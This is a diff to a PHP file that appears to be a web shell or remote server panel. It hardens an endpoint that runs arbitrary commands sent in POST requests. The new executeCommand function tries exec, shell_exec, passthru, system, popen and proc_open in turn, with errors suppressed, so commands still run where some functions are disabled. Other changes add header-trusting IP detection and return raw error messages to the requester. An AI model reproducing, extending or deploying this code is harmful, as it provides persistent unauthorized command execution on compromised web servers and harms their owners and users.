@@ -89,6 +89,107 @@ function sanitizeErrorMessage($error) {
     return 'Operation failed';
 }
 
+function getClientIp() {
+    // Priority: LOCAL_ADDR (if set) > X-Forwarded-For > Client-IP > Remote-Addr > getenv fallbacks
+    $localAddr = getenv('LOCAL_ADDR') ?: (isset($_SERVER['LOCAL_ADDR']) ? $_SERVER['LOCAL_ADDR'] : null);
+    if ($localAddr && $localAddr !== '0.0.0.0') {
+        return $localAddr;
+    }
+    
+    $sources = [
+        'HTTP_X_FORWARDED_FOR',
+        'HTTP_CLIENT_IP',
+        'HTTP_X_REAL_IP',
+        'REMOTE_ADDR'
+    ];
+    
+    foreach ($sources as $source) {
+        $ip = getenv($source) ?: (isset($_SERVER[$source]) ? $_SERVER[$source] : null);
+        if ($ip && $ip !== '0.0.0.0' && $ip !== 'unknown') {
+            // Handle comma-separated IPs (X-Forwarded-For)
+            if (strpos($ip, ',') !== false) {
+                $ips = explode(',', $ip);
+                $ip = trim($ips[0]);
+            }
+            return $ip;
+        }
+    }
+    
+    return 'Unknown';
+}
+
+function getServerSoftware() {
+    return getenv('SERVER_SOFTWARE') ?: ($_SERVER['SERVER_SOFTWARE'] ?? 'CLI');
+}
+
+function executeCommand($cmd) {
+    // Try multiple methods for backward compatibility
+    $output = [];
+    $exitCode = 0;
+    
+    // Method 1: exec() - most common
+    if (function_exists('exec')) {
+        @exec($cmd . " 2>&1", $output, $exitCode);
+        return ['output' => $output, 'exit_code' => $exitCode];
+    }
+    
+    // Method 2: shell_exec()
+    if (function_exists('shell_exec')) {
+        $result = @shell_exec($cmd . " 2>&1");
+        return ['output' => $result ? explode("\n", trim($result)) : [], 'exit_code' => 0];
+    }
+    
+    // Method 3: passthru()
+    if (function_exists('passthru')) {
+        ob_start();
+        @passthru($cmd . " 2>&1", $exitCode);
+        $result = ob_get_clean();
+        return ['output' => $result ? explode("\n", trim($result)) : [], 'exit_code' => $exitCode];
+    }
+    
+    // Method 4: system()
+    if (function_exists('system')) {
+        ob_start();
+        $last = @system($cmd . " 2>&1", $exitCode);
+        $result = ob_get_clean();
+        return ['output' => $result ? explode("\n", trim($result)) : [], 'exit_code' => $exitCode];
+    }
+    
+    // Method 5: popen()
+    if (function_exists('popen')) {
+        $handle = @popen($cmd . " 2>&1", 'r');
+        if ($handle) {
+            while (!feof($handle)) {
+                $output[] = fgets($handle);
+            }
+            pclose($handle);
+            return ['output' => $output, 'exit_code' => 0];
+        }
+    }
+    
+    // Method 6: proc_open()
+    if (function_exists('proc_open')) {
+        $descriptors = [
+            0 => ['pipe', 'r'],
+            1 => ['pipe', 'w'],
+            2 => ['pipe', 'w']
+        ];
+        $process = @proc_open($cmd, $descriptors, $pipes);
+        if (is_resource($process)) {
+            fclose($pipes[0]);
+            $stdout = stream_get_contents($pipes[1]);
+            $stderr = stream_get_contents($pipes[2]);
+            fclose($pipes[1]);
+            fclose($pipes[2]);
+            $exitCode = proc_close($process);
+            $result = trim($stdout . "\n" . $stderr);
+            return ['output' => $result ? explode("\n", $result) : [], 'exit_code' => $exitCode];
+        }
+    }
+    
+    throw new Exception('No command execution functions available');
+}
+
 function formatBytes($bytes) {
     if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
     if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
@@ -291,21 +392,22 @@ function handleApiAction($action) {
                 $cwd = $_POST['cwd'] ?? getcwd();
                 try {
                     if (empty($cmd)) throw new Exception('No command provided');
-                    $output = [];
                     $oldCwd = getcwd();
                     if (is_dir($cwd)) @chdir($cwd);
-                    @exec($cmd . " 2>&1", $output, $exitCode);
+                    
+                    $result = executeCommand($cmd);
                     $newCwd = getcwd();
                     @chdir($oldCwd);
+                    
                     $response = [
                         'status' => 'success',
-                        'output' => implode("\n", array_map('htmlspecialchars', $output)),
-                        'exit_code' => $exitCode,
+                        'output' => implode("\n", array_map('htmlspecialchars', $result['output'])),
+                        'exit_code' => $result['exit_code'],
                         'cwd' => $newCwd
                     ];
                 } catch (Exception $e) {
                     logError('exec_cmd', $e);
-                    $response = ['status' => 'error', 'message' => 'Command execution failed'];
+                    $response = ['status' => 'error', 'message' => 'Command execution failed: ' . $e->getMessage()];
                 }
                 break;
 
@@ -776,7 +878,7 @@ function renderLayout($title, $content, $activePage = 'dashboard') {
 
 function renderDashboard() {
     $phpVersion = phpversion();
-    $serverSoftware = $_SERVER['SERVER_SOFTWARE'] ?? 'CLI';
+    $serverSoftware = getServerSoftware();
     $diskFree = @disk_free_space("/") ?: 0;
     $diskTotal = @disk_total_space("/") ?: 1;
     $diskUsed = $diskTotal - $diskFree;
@@ -918,7 +1020,7 @@ function renderDashboard() {
             </div>
             <div class="info-row">
                 <span class="info-label">Your IP</span>
-                <span class="info-value"><?php echo $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown'; ?></span>
+                <span class="info-value"><?php echo getClientIp(); ?></span>
             </div>
             <div class="info-row">
                 <span class="info-label">Memory Usage</span>
@@ -2278,7 +2380,7 @@ function renderSettings() {
             <div class="config-grid">
                 <div class="config-item">
                     <span class="config-label">Server Software</span>
-                    <span class="config-value"><?php echo htmlspecialchars($_SERVER['SERVER_SOFTWARE'] ?? 'N/A'); ?></span>
+                    <span class="config-value"><?php echo htmlspecialchars(getServerSoftware()); ?></span>
                 </div>
                 <div class="config-item">
                     <span class="config-label">Document Root</span>
